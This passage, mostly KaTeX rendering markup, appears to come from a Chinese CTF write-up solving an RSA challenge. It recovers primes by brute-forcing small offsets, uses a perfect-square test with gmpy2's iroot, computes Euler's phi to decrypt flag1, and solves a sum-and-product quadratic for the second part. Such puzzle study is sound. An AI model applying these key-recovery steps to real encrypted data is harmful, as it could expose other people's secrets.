class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><msub><mi>N</mi><mn>1</mn></msub><mo>−</mo><msub><mi>N</mi><mn>2</mn></msub><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msup><mo>)</mo><mn>2</mn></msup><mo>+</mo><mn>4</mn><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msub><mi>N</mi><mn>2</mn></msub><mo>=</mo><mo>(</mo><mi>p</mi><msub><mi>q</mi><mn>0</mn></msub><mo>−</mo><msub><mi>p</mi><mn>0</mn></msub><mi>q</mi><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msup><mo>)</mo><mn>2</mn></msup><mo>+</mo><mn>4</mn><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msub><mi>N</mi><mn>2</mn></msub><mo>=</mo><mo>(</mo><mi>p</mi><msub><mi>q</mi><mn>0</mn></msub><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><mi>q</mi><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msup><mo>)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(N_1-N_2+p_0q_0)^2+4p_0q_0N_2=(pq_0-p_0q+p_0q_0)^2+4p_0q_0N_2=(pq_0+p_0q+p_0q_0)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>知，我们可以爆破<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_0,q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><msub><mi>N</mi><mn>1</mn></msub><mo>−</mo><msub><mi>N</mi><mn>2</mn></msub><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msup><mo>)</mo><mn>2</mn></msup><mo>+</mo><mn>4</mn><msub><mi>p</mi><mn>0</mn></msub><msub><mi>q</mi><mn>0</mn></msub><msub><mi>N</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">(N_1-N_2+p_0q_0)^2+4p_0q_0N_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是否为完全平方数来判断<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub><mi mathvariant="normal">，</mi><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_0，q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是否为我们所求，这可以用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>m</mi><mi>p</mi><mi>y</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">gmpy2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">2</span></span></span></span>库里的iroot函数实现。找到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_0,q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>后求出p,q,p1,q1，然后通过欧拉函数的积性知<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo>(</mo><mi>n</mi><mn>1</mn><mo>)</mo><mo>=</mo><mo>(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo>)</mo><mo>(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo>)</mo><mo>(</mo><mi>p</mi><mn>1</mn><mo>−</mo><mn>1</mn><mo>)</mo><mo>(</mo><mi>q</mi><mn>1</mn><mo>−</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">\varphi(n1)=(p-1)(q-1)(p1-1)(q1-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，解出第一部分的flag1。</p>
+<h5 id="第二部分">第二部分</h5>
+<p>已知p2,q2之和,p2,q2之积，可通过求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mo>(</mo><msub><mi>p</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><mo>)</mo><mi>x</mi><mo>+</mo><msub><mi>p</mi><mn>2</mn></msub><msub><mi>q</mi><mn>2</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x^2-(p_2+q_2)x+p_2q_2=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span 